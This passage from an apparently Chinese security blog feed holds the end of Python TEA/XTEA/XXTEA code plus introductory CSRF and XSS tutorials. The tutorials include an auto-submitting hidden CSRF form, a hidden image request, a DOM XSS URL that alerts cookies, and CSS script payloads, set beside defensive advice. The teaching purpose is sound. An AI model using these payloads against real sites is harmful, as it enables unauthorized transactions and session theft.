((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1)        v0 = v0 &amp; 0xFFFFFFFF        v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3)        v1 = v1 &amp; 0xFFFFFFFF    v[0] = v0    v[1] = v1    return vdef decrypt(v, k):    v0 = v[0]    v1 = v[1]    x = 0xC6EF3720    delta = 0x9E3779B9    k0 = k[0]    k1 = k[1]    k2 = k[2]    k3 = k[3]    for i in range(32):        v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3)        v1 = v1 &amp; 0xFFFFFFFF        v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1)        v0 = v0 &amp; 0xFFFFFFFF        x -= delta        x = x &amp; 0xFFFFFFFF    v[0] = v0    v[1] = v1    return vif __name__ == &#39;__main__&#39;:    plain = [1, 2]    key = [2, 2, 3, 4]    encrypted = encrypt(plain, key)    print encrypted    decrypted = decrypt(encrypted, key)    print decrypted</code></pre><h1 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a><a href="https://en.wikipedia.org/wiki/XTEA" target="_blank" rel="noopener">XTEA</a></h1><p><code>XTEA</code> 是 <code>TEA</code> 的升级版，增加了更多的密钥表，移位和异或操作等等。</p><p>加密过程：</p><p><img src="/pics/Python实现TEA、XTEA、XXTEA加密解密算法/2.png" srcset="/img/loading.gif" alt></p><p>Python 实现：</p><pre><code class="python">#!/usr/bin/env pythondef encrypt(rounds, v, k):    v0 = v[0]    v1 = v[1]    x = 0    delta = 0x9E3779B9    for i in range(rounds):        v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3])        v0 = v0 &amp; 0xFFFFFFFF        x += delta        x = x &amp; 0xFFFFFFFF        v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3])        v1 = v1 &amp; 0xFFFFFFFF    v[0] = v0    v[1] = v1    return vdef decrypt(rounds, v, k):    v0 = v[0]    v1 = v[1]    delta = 0x9E3779B9    x = delta * rounds    for i in range(rounds):        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3])        v1 = v1 &amp; 0xFFFFFFFF        x -= delta        x = x &amp; 0xFFFFFFFF        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3])        v0 = v0 &amp; 0xFFFFFFFF    v[0] = v0    v[1] = v1    return vif __name__ == &#39;__main__&#39;:    plain = [1, 2]    key = [2, 2, 3, 4]    rounds = 32    encrypted = encrypt(rounds, plain, key)    print encrypted    decrypted = decrypt(rounds, encrypted, key)    print decrypted</code></pre><h1 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a><a href="https://en.wikipedia.org/wiki/XXTEA" target="_blank" rel="noopener">XXTEA</a></h1><p><code>XXTEA</code>，又称 <code>Corrected Block TEA</code>，是 <code>XTEA</code> 的升级版。</p><p>加密过程：</p><p><img src="/pics/Python实现TEA、XTEA、XXTEA加密解密算法/3.png" srcset="/img/loading.gif" alt></p><p>Python 实现：</p><pre><code class="python">#!/usr/bin/env pythondef shift(z, y, x, k, p, e):    return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def encrypt(v, k):    delta = 0x9E3779B9    n = len(v)    rounds = 6 + 52 / n    x = 0    z = v[n - 1]    for i in range(rounds):        x = (x + delta) &amp; 0xFFFFFFFF        e = (x &gt;&gt; 2) &amp; 3        for p in range(n - 1):            y = v[p + 1]            v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF            z = v[p]        p += 1        y = v[0]        v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF        z = v[n - 1]    return vdef decrypt(v, k):    delta = 0x9E3779B9    n = len(v)    rounds = 6 + 52 / n    x = (rounds * delta) &amp; 0xFFFFFFFF    y = v[0]    for i in range(rounds):        e = (x &gt;&gt; 2) &amp; 3        for p in range(n - 1, 0, -1):            z = v[p - 1]            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF            y = v[p]        p -= 1        z = v[n - 1]        v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF        y = v[0]        x = (x - delta) &amp; 0xFFFFFFFF    return vif __name__ == &#39;__main__&#39;:    plain = [1, 2]    key = [2, 2, 3, 4]    encrypted = encrypt(plain, key)    print encrypted    decrypted = decrypt(encrypted, key)    print decrypted</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/gsls200808/article/details/48243019" target="_blank" rel="noopener">https://blog.csdn.net/gsls200808/article/details/48243019</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>crypto</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从零开始认识跨站请求伪造（Cross-site Request Forgery）</title>
    <link href="/2019/08/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%AE%A4%E8%AF%86%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88Cross-site-Request-Forgery%EF%BC%89/"/>
    <url>/2019/08/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%AE%A4%E8%AF%86%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88Cross-site-Request-Forgery%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>常常听到 CSRF，但不怎么了解它具体的机制，简单记录一下。</p><a id="more"></a><h1 id="What-is-CSRF"><a href="#What-is-CSRF" class="headerlink" title="What is CSRF"></a>What is CSRF</h1><p>CSRF（跨站请求伪造，<code>Cross-site Request Forgery</code>）也被称为 <code>One-click Attack</code> 或者 <code>Session Riding</code>。简单的来说，就是<strong>攻击者利用受害者的身份，以受害者的名义发送恶意请求</strong>。</p><p>CSRF 这种攻击方式在 2000 年被国外的安全人员提出，但在国内，直到 2006 年才开始被关注。2008 年，国内外的多个大型社区和交互网站分别爆出 CSRF 漏洞，如：纽约时报，Metafilter，YouTube，百度等等。而现在，互联网的许多站点仍对此毫无防备，以至于安全业界称 CSRF 为“沉睡的巨人”。</p><p><img src="/pics/从零开始认识跨站请求伪造/1.png" srcset="/img/loading.gif" alt></p><p>首先比较一下 XSS 和 CSRF：</p><pre><code># XSS攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击XSS容易发现，因为攻击者需要登录后台完成攻击。管理员可以看日志发现攻击者XSS的目的是获取用户的身份信息，攻击者窃取到的是用户的身份（session/cookie）# CSRF攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击CSRF的攻击一直是管理员自己实现的，攻击者只负责了构造代码CSRF是利用用户当前的身份去做一些未经过授权的操作</code></pre><p>用一个小故事简单的介绍一下什么是 CSRF：</p><ol><li>我们先假设支付宝存在 CSRF 漏洞，受害者的支付宝账号是 <code>alibaba</code>，攻击者的支付宝账号是 <code>hacker</code></li><li>然后我们通过网页请求的方式 <code>http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=alibaba2</code> 可以把账号 <code>alibaba</code> 的 10000 元转到另外一个账号 <code>alibaba2</code> 上去。通常情况下，该请求发送到支付宝服务器后，服务器会先验证该请求是否来自一个合法的 <code>session</code> 并且该 <code>session</code> 的用户已经成功登陆</li><li>攻击者在支付宝有账号 <code>hacker</code>，并且他知道上文中的 URL 可以进行转账操作，于是他可以发送一个请求 <code>http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=hacker</code> 到支付宝后台。但是这个请求是来自攻击者而不是来自 <code>alibaba</code>，所以不能通过安全认证，因此该请求作废</li><li>这时，攻击者 <code>hacker</code> 想到了用 CSRF 的方式，他自己做了个黄色网站，在网站中放了如下代码：<code>http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=hacker</code>，并且通过黄色链接诱使受害者来访问他的网站。当受害者禁不住诱惑时就会点了进去，上述请求就会从受害者的浏览器发送到支付宝，而且这个请求会附带受害者的浏览器中的 <code>cookie</code></li><li>大多数情况下，该请求会失败，因为支付宝会要求受害者的认证信息，但是如果刚访问支付宝不久，还没有关闭支付宝页面，浏览器中的 <code>cookie</code> 仍然存有认证信息，这个请求就会得到响应，从受害者的账户中转 10000 元到 <code>hacker</code> 账户里，而受害者丝毫不知情，攻击者拿到钱后逍遥法外</li></ol><h1 id="How-to-Attack"><a href="#How-to-Attack" class="headerlink" title="How to Attack"></a>How to Attack</h1><p>CSRF 有两种攻击方式，一种是基于 GET 请求方式的利用，另一种是基于 POST 请求方式的利用。</p><h2 id="Get-Method"><a href="#Get-Method" class="headerlink" title="Get Method"></a>Get Method</h2><pre><code>&lt;img src=&#39;https://www.xxx.com/bank.php?transferTo=hacker&#39; width=&#39;0&#39; height=&#39;0&#39; /&gt;&lt;a href=&#39;/test&#39;&gt;start&lt;/a&gt;</code></pre><h2 id="Post-Method"><a href="#Post-Method" class="headerlink" title="Post Method"></a>Post Method</h2><pre><code>&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;&lt;form method=&#39;POST&#39; action=&#39;https://www.xxx.com/bank.php&#39; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;  &lt;input type=&#39;hidden&#39; name=&#39;id&#39; value=&#39;3&#39;&gt;  &lt;input type=&#39;submit&#39; value=&#39;submit&#39;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</code></pre><h1 id="How-to-Prevent"><a href="#How-to-Prevent" class="headerlink" title="How to Prevent"></a>How to Prevent</h1><p>防范 CSRF 攻击，其实本质就是要求网站能够识别出哪些请求是非正常用户主动发起的。这就要求我们在请求中嵌入一些额外的授权数据，让网站服务器能够区分出这些未授权的请求。</p><h2 id="Synchronizer-token-pattern"><a href="#Synchronizer-token-pattern" class="headerlink" title="Synchronizer token pattern"></a>Synchronizer token pattern</h2><p>令牌同步模式（Synchronizer token pattern，简称 STP）是在用户请求的页面中的所有表单中嵌入一个 token，在服务端验证这个 token 的技术。token 可以是任意的内容，但是一定要保证无法被攻击者猜测到或者查询到。攻击者在请求中无法使用正确的 token，因此可以判断出未授权的请求</p><h2 id="Cookie-to-Header-Token"><a href="#Cookie-to-Header-Token" class="headerlink" title="Cookie-to-Header Token"></a>Cookie-to-Header Token</h2><p>对于使用 Js 作为主要交互技术的网站，将 CSRF 的 token 写入到 cookie 中</p><pre><code>Set-Cookie: CSRF-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/</code></pre><p>然后使用 javascript 读取 token 的值，在发送 http 请求的时候将其作为请求的 header</p><pre><code>X-CSRF-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql</code></pre><p>最后服务器验证请求头中的 token 是否合法</p><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>使用验证码可以杜绝 CSRF 攻击，但是这种方式要求每个请求都输入一个验证码，显然没有哪个网站愿意使用这种粗暴的方式，用户体验太差，用户会疯掉的。</p><h2 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h2><p>根据 HTTP 协议，在 HTTP 头部中有一个 Referer 字段，它记录了该 HTTP 请求所在的地址，表示 HTTP 请求从那个页面发出的。比如当访问 <code>http://zhifubao.com/withdraw?account=lyq&amp;amount=10000&amp;for=xxx</code>，用户必须先登录支付宝网站，然后通过点击页面的的按钮来触发转账事件。此时，转账请求的 Referer 值就是转账页面所在的 URL，通常是以 <code>zhifubao.com</code> 域名开头的地址。如果攻击者要实行 CSRF 攻击，那么他只能在自己的站点构造请求，此时 Referer 的值就指向黑客自己的网站。因此要防御 CSRF 攻击，支付宝只需要对每一个转账请求验证其 Referer 值，如果是以 <code>zhifubao.com</code> 开头的域名，则是合法请求，相反，则是非法请求并拒绝。</p><p>这种方法的好处就是简单易行，只需要在后台添加一个拦截器来检查 Referer 即可。然而这种办法并不是万无一失，Referer 的值是由浏览器提供的，一些低级的浏览器可以通过某种方式篡改 Referer 的值，这就给了攻击者可乘之机；而一些高级浏览器处于安全考虑，可以让用户设置发送 HTTP 请求时不再提供 Referer 值，这样当他们正常访问支付宝网站时，因为没有提供 Referer 值而被误认为 CERF 攻击，拒绝访问。实际应用中通常采用第二种方法来防御 CSRF 攻击。</p><h2 id="尽量使用-POST，限制-GET"><a href="#尽量使用-POST，限制-GET" class="headerlink" title="尽量使用 POST，限制 GET"></a>尽量使用 POST，限制 GET</h2><p>GET 接口能够直接将请求地址暴露给攻击者，所以要防止 CSRF 一定最好不要用 GET。当然 POST 并不是万无一失，攻击者只需要构造一个 form 表单就可以，但需要在第三方页面做，这样就增加了暴露的可能性。</p><h2 id="在-HTTP-头部添加自定义属性"><a href="#在-HTTP-头部添加自定义属性" class="headerlink" title="在 HTTP 头部添加自定义属性"></a>在 HTTP 头部添加自定义属性</h2><p>这种方法也是使用 token 并验证，但是它是把 token 放在 HTTP 请求头部中。通过使用 AJAX 我们可以在我们的请求头部中添加我们的自定义属性，但是这种方法要求我们将整个站的请求全部改成 AJAX，如果是新站还好，老站的话无疑是需要重写整个站点的，这是很不可取的。</p><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul><li><a href="http://exp-blog.com/2019/01/13/pid-2927/" target="_blank" rel="noopener">RootMe 解题报告 [Web-Client : CSRF – 0 protection]</a></li><li><a href="http://exp-blog.com/2019/01/13/pid-2933/" target="_blank" rel="noopener">RootMe 解题报告 [Web-Client : CSRF – token bypass]</a></li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.freebuf.com/articles/web/55965.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/55965.html</a><br><a href="https://segmentfault.com/a/1190000008505616" target="_blank" rel="noopener">https://segmentfault.com/a/1190000008505616</a><br><a href="https://www.jianshu.com/p/855395f9603b" target="_blank" rel="noopener">https://www.jianshu.com/p/855395f9603b</a><br><a href="https://juejin.im/post/5bc009996fb9a05d0a055192" target="_blank" rel="noopener">https://juejin.im/post/5bc009996fb9a05d0a055192</a><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a><br><a href="https://blog.techbridge.cc/2017/02/25/csrf-introduction/" target="_blank" rel="noopener">https://blog.techbridge.cc/2017/02/25/csrf-introduction/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探跨站脚本攻击（Cross-Site Scripting）</title>
    <link href="/2019/08/12/%E5%88%9D%E6%8E%A2%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88Cross-Site-Scripting%EF%BC%89/"/>
    <url>/2019/08/12/%E5%88%9D%E6%8E%A2%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88Cross-Site-Scripting%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>最近在做渗透测试，需要接触一些 WEB 方面的基础知识。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>XSS 全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为 XSS，比较合适的方式应该叫做跨站脚本攻击。</p><p>跨站脚本攻击是一种常见的 web 安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。</p><p>注入点：</p><ol><li>GET 请求参数</li><li>POST 请求参数</li><li>UA（User Agent）</li><li>Referer</li><li>URL</li><li>…</li></ol><p>总共分成三类，存储型 XSS（<code>Stored XSS</code>）、反射型 XSS（<code>Reflected XSS</code>）和 <code>DOM-based XSS</code>。几种攻击方式的图解可以参考<a href="http://blog.nsfocus.net/xss-start-finish/" target="_blank" rel="noopener">绿盟的这篇文章</a>，三种 XSS 可以参考<a href="https://blog.csdn.net/u011781521/article/details/53894399" target="_blank" rel="noopener">这篇文章</a>在本地测试</p><h2 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h2><p>也叫持久型 XSS，那些将恶意脚本永久的保存在目标服务器上的攻击方式，如存储在数据库、消息论坛、访问日志、评论内容扥等。Payload 是有经过存储的，当一个页面存在存储型 XSS 的时候，XSS 注入成功后，那么每次访问该页面都将触发 XSS。</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p><a href="http://www.secist.com/archives/5388.html" target="_blank" rel="noopener">http://www.secist.com/archives/5388.html</a></p><h2 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h2><p>也叫非持久型 XSS，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。最常见的是 Payload 是构造在网址的某个 GET 参数的值里。</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p><a href="https://blog.csdn.net/binyao02123202/article/details/9041113" target="_blank" rel="noopener">https://blog.csdn.net/binyao02123202/article/details/9041113</a></p><h2 id="DOM-Based-型-XSS"><a href="#DOM-Based-型-XSS" class="headerlink" title="DOM-Based 型 XSS"></a>DOM-Based 型 XSS</h2><p>攻击者利用原生 JavaScript 代码篡改客户端的 DOM 结构，导致用户操作执行了“意外”的动作。</p><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h3><pre><code class="html">Select your language:&lt;select  &gt;&lt;script&gt;    document.write(&quot;&lt;OPTION value=1&gt;&quot; + document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;) + 8) + &quot;&lt;/OPTION&gt;&quot;);    document.write(&quot;&lt;OPTION value=2&gt;English&lt;/OPTION&gt;&quot;);  &lt;/script&gt;&lt;/select&gt;…</code></pre><p>网站 URL 则为这个样子：</p><pre><code class="url">http://www.some.site/page.html?default=French</code></pre><p>利用这个页面 DOM 结构的漏洞，向受害者发送下面的链接，点开这个链接就会将用户的 cookie 全部 alert 出来了：</p><pre><code class="url">http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><h1 id="How-to-Test"><a href="#How-to-Test" class="headerlink" title="How to Test"></a>How to Test</h1><h2 id="Where"><a href="#Where" class="headerlink" title="Where"></a>Where</h2><ul><li>直接插入到 <code>script</code> 标签里</li><li>插入到 <code>html</code> 注释里</li><li>插入到 <code>html</code> 标签的属性名里</li><li>插入到 <code>html</code> 标签的属性值里</li><li>作为 <code>html</code> 标签的名字</li><li>直接插入到 <code>css</code> 里</li></ul><h3 id="Manually"><a href="#Manually" class="headerlink" title="Manually"></a>Manually</h3><ul><li>参数中提交 <code>xss payload</code> 代码</li><li>在所有可以提交参数并能在页面返回的位置上<ul><li><code>url</code> 的每一个参数</li><li><code>url</code> 本身</li><li>表单</li><li>搜索框</li><li>…</li></ul></li></ul><h3 id="Usual-Scene"><a href="#Usual-Scene" class="headerlink" title="Usual Scene"></a>Usual Scene</h3><ul><li>重灾区——评论区、留言区、个人信息、订单信息等</li><li>针对型——站内信、网页即时通讯、私信、意见反馈等</li><li>存在风险——搜索框、当前目录、图片属性等</li></ul><h1 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h1><p><a href="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt" target="_blank" rel="noopener">https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt</a><br><a href="https://github.com/ismailtasdelen/xss-payload-list" target="_blank" rel="noopener">https://github.com/ismailtasdelen/xss-payload-list</a></p><h1 id="How-to-Avoid"><a href="#How-to-Avoid" class="headerlink" title="How to Avoid"></a>How to Avoid</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="不要把不受信任的数据插入到原本允许-JavaScript-可以放置的地方"><a href="#不要把不受信任的数据插入到原本允许-JavaScript-可以放置的地方" class="headerlink" title="不要把不受信任的数据插入到原本允许 JavaScript 可以放置的地方"></a>不要把不受信任的数据插入到原本允许 JavaScript 可以放置的地方</h3><ol><li><code>&lt;script&gt;...永远不要把不受信任的数据放在这...&lt;/script&gt;</code>：直接放在 script 标签内</li><li><code>&lt;!--...永远不要把不受信任的数据放在这...--&gt;</code>：放在 HTML 注释内</li><li><code>&lt;div ...永远不要把不受信任的数据放在这...=test /&gt;</code>：做为一个属性名</li><li><code>&lt;永远不要把不受信任的数据放在这... href=&quot;/test&quot; /&gt;</code>：做为一个标签名</li><li><code>&lt;style&gt;...永远不要把不受信任的数据放在这...&lt;/style&gt;</code>：直接放在 style 标签内复制代码原则 1——在向元素中插入不受信任的 HTML 代码之前一定要进行转义</li></ol><h3 id="在向元素中插入不受信任的-HTML-代码之前一定要进行转义"><a href="#在向元素中插入不受信任的-HTML-代码之前一定要进行转义" class="headerlink" title="在向元素中插入不受信任的 HTML 代码之前一定要进行转义"></a>在向元素中插入不受信任的 HTML 代码之前一定要进行转义</h3><ol><li><code>&lt;body&gt;...将不受信任的数据转义后再放在这...&lt;/body&gt;</code></li><li><code>&lt;div&gt;...将不受信任的数据转义后再放在这...&lt;/div&gt;</code></li><li>…</li></ol><p>常用的转义规则如下：</p><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">转义后的字符</th></tr></thead><tbody><tr><td style="text-align:center"><code>&amp;</code></td><td style="text-align:center"><code>&amp;amp;</code></td></tr><tr><td style="text-align:center"><code>&lt;</code></td><td style="text-align:center"><code>&amp;lt;</code></td></tr><tr><td style="text-align:center"><code>&gt;</code></td><td style="text-align:center"><code>&amp;gt;</code></td></tr><tr><td style="text-align:center"><code>&quot;</code></td><td style="text-align:center"><code>&amp;quot;</code></td></tr><tr><td style="text-align:center"><code>&#39;</code></td><td style="text-align:center"><code>&amp;#x27;</code></td></tr><tr><td style="text-align:center"><code>/</code></td><td style="text-align:center"><code>&amp;#x2F;</code></td></tr></tbody></table><h3 id="向元素的属性插入不受信任的-HTML-代码之前一定要进行转义"><a href="#向元素的属性插入不受信任的-HTML-代码之前一定要进行转义" class="headerlink" title="向元素的属性插入不受信任的 HTML 代码之前一定要进行转义"></a>向元素的属性插入不受信任的 HTML 代码之前一定要进行转义</h3><ol><li><code>&lt;div attr=...将不受信任的数据转义后再放在这...&gt;content&lt;/div&gt;</code>：在没有加引号的属性值内</li><li><code>&lt;div attr=&#39;...将不受信任的数据转义后再放在这...&#39;&gt;content&lt;/div&gt;</code>：在加了单引号的属性值内</li><li><code>&lt;div attr=&quot;...将不受信任的数据转义后再放在这...&quot;&gt;content&lt;/div&gt;</code>：在加了双引号的属性值内</li></ol><h3 id="用不受信任的数据向-JavaScript-代码赋值前，一定要进行转义"><a href="#用不受信任的数据向-JavaScript-代码赋值前，一定要进行转义" class="headerlink" title="用不受信任的数据向 JavaScript 代码赋值前，一定要进行转义"></a>用不受信任的数据向 JavaScript 代码赋值前，一定要进行转义</h3><ol><li><code>&lt;script&gt;alert(&#39;...将不受信任的数据转义后再放在这...&#39;)&lt;/script&gt;</code>：在一个字符串之内</li><li><code>&lt;script&gt;x=&#39;...将不受信任的数据转义后再放在这...&#39;&lt;/script&gt;</code>：在表达式的一侧</li><li><code>&lt;div onmouseover=&quot;x=&#39;...将不受信任的数据转义后再放在这...&#39;&quot;&lt;/div&gt;</code>：在事件处理函数内</li></ol><p>有一些 JavaScript 函数永远无法安全的使用不受信任的数据作为输入：</p><pre><code class="html">&lt;script&gt;  window.setInterval(&quot;即使你做了转义，但是仍然可能被XSS攻击&quot;);&lt;/script&gt;</code></pre><h3 id="在-HTML-的上下文中对-JSON-值进行转义，并用-JSON-parse-方法来读取值"><a href="#在-HTML-的上下文中对-JSON-值进行转义，并用-JSON-parse-方法来读取值" class="headerlink" title="在 HTML 的上下文中对 JSON 值进行转义，并用 JSON.parse()方法来读取值"></a>在 HTML 的上下文中对 JSON 值进行转义，并用 JSON.parse()方法来读取值</h3><p>一定要确保 <code>http response</code> 中的头部信息的 <code>content-type</code> 为 <code>application/json</code>，而不是 <code>text/html</code>，因为那样的话，很可能会被人利用进行 XSS 攻击：</p><pre><code>HTTP/1.1 200Date: Wed, 06 Feb 2013 10:28:54 GMTServer: Microsoft-IIS/7.5....Content-Type: text/html; charset=utf-8 &lt;-- bad...Content-Length: 373Keep-Alive: timeout=5, max=100Connection: Keep-Alive{&quot;Message&quot;:&quot;No HTTP resource was found that matches the request URI &#39;dev.net.ie/api/pay/.html?HouseNumber=9&amp;AddressLine=The+Gardens&lt;script&gt;alert(1)&lt;/script&gt;&amp;AddressLine2=foxlodge+woods&amp;TownName=Meath&#39;.&quot;,&quot;MessageDetail&quot;:&quot;No type was foundthat matches the controller named &#39;pay&#39;.&quot;}   &lt;-- 这里script标签有可能会被执行</code></pre><p>使用 <code>application/json</code> 就不会被利用：</p><pre><code>HTTP/1.1 200Date: Wed, 06 Feb 2013 10:28:54 GMTServer: Microsoft-IIS/7.5....Content-Type: application/json; charset=utf-8 &lt;--good...</code></pre><h3 id="将不受信任的数据作为-CSS-属性插入到文档之前一定要进行转义"><a href="#将不受信任的数据作为-CSS-属性插入到文档之前一定要进行转义" class="headerlink" title="将不受信任的数据作为 CSS 属性插入到文档之前一定要进行转义"></a>将不受信任的数据作为 CSS 属性插入到文档之前一定要进行转义</h3><ol><li><code>&lt;style&gt;selector { property : ...将不受信任的数据转义后再放在这...; } &lt;/style&gt;</code>：属性值</li><li><code>&lt;style&gt;selector { property : &quot;...将不受信任的数据转义后再放在这...&quot;; } &lt;/style&gt;</code>：属性值</li><li><code>&lt;span style=&quot;property : ...将不受信任的数据转义后再放在这...&quot;&gt;text&lt;/span&gt;</code>：属性值</li></ol><p>有一些 <code>css</code> 属性值对于不受信任的数据是无法确保万无一失的——即使做了转义，如下面的两个 <code>css</code> 属性：</p><pre><code class="css"> {  background-url: &quot;javascript:alert(1)&quot;;} {  text-size: &quot;expression(alert(&#39;XSS&#39;))&quot;;} // only in IE</code></pre><p>应该确保所有 CSS 属性值引入的外部链接是由 <code>http</code> 开头的，而不是 <code>javascript</code> 开头的</p><h3 id="向-HTML-的-URL-参数插入将不受信任的数据前，一定要将进行转义"><a href="#向-HTML-的-URL-参数插入将不受信任的数据前，一定要将进行转义" class="headerlink" title="向 HTML 的 URL 参数插入将不受信任的数据前，一定要将进行转义"></a>向 HTML 的 URL 参数插入将不受信任的数据前，一定要将进行转义</h3><pre><code class="html">&lt;a href=&quot;http://www.somesite.com?test=...将不受信任的数据转义后再放在这...&quot;&gt;  link&lt;/a&gt;</code></pre><h2 id="Better"><a href="#Better" class="headerlink" title="Better"></a>Better</h2><h3 id="对于-cookie-使用-httpOnly-标识"><a href="#对于-cookie-使用-httpOnly-标识" class="headerlink" title="对于 cookie 使用 httpOnly 标识"></a>对于 cookie 使用 httpOnly 标识</h3><p>使用 <code>httpOnly</code> 标识后的 <code>cookie JavaScript</code> 是无法获取的，又由于 <code>cookie</code> 是基于同源原则，所以一定程度上会防范那些利用客户 <code>cookie</code> 的 <code>XSS</code> 攻击。</p><h3 id="在-http-header-中使用-Content-Security-Policy"><a href="#在-http-header-中使用-Content-Security-Policy" class="headerlink" title="在 http header 中使用 Content Security Policy"></a>在 http header 中使用 Content Security Policy</h3><p>利用 <code>http header</code> 中的属性值 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noopener"><code>Content-Security-Policy</code></a> 来防范 <code>XSS</code>。<code>HTTP</code> 响应头中 <code>Content-Security-Policy</code> 允许站点管理者在指定的页面控制用户代理的资源。除了少数例外，这条政策将极大地指定服务源以及脚本端点。</p><h3 id="使用自动转义模板系统"><a href="#使用自动转义模板系统" class="headerlink" title="使用自动转义模板系统"></a>使用自动转义模板系统</h3><p>许多 Web 应用程序框架提供了自动的上下文转义功能，如 <a href="https://docs.angularjs.org/api/ng/service/sce" target="_blank" rel="noopener"><code>AngularJS</code> 严格的上下文转义</a>和 <a href="https://golang.org/pkg/html/template/" target="_blank" rel="noopener"><code>Go</code> 模板</a>。尽可能使用这些技术。</p><h3 id="在-http-header-中使用-X-XXS-Protection"><a href="#在-http-header-中使用-X-XXS-Protection" class="headerlink" title="在 http header 中使用 X-XXS-Protection"></a>在 http header 中使用 X-XXS-Protection</h3><p><code>http header</code> 中 <code>X-XSS-Protection</code> 响应头是 <code>Internet Explorer</code>、<code>Chrome</code> 和 <code>Safari</code> 的一个功能，当检测到跨站脚本攻击时，浏览器将停止加载页面。虽然这些保护在现代浏览器中基本上是不必要的，当网站实施一个强大的 <code>Content-Security-Policy</code> 来禁用内联的 